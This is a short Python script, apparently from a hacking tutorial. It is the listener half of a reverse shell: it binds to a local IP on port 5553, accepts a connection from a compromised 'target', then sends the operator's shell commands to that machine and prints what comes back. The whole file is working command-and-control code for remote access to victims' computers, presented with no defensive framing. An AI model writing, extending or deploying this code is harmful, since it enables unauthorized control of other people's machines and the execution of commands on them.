import os
import socket
import json

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())
    
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()#bytes
            return json.loads(data)
        except ValueError:
            continue


def target_comm():
    while True:
        cmd = input('* Shell~%s: ' % str(ip))
        reliable_send(cmd)
        if cmd == 'exit':
            break
        elif cmd == 'clear':
            os.system('clear')
        elif cmd[:3] =='cd ': #directory changing checking for first 3 characters
            pass
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('192.168.1.58',5553))
print('[*] Listening for incoming connections')
sock.listen(5)
target, ip = sock.accept()
print('[*] Connection established w/: ' + str(ip))
target_comm() 


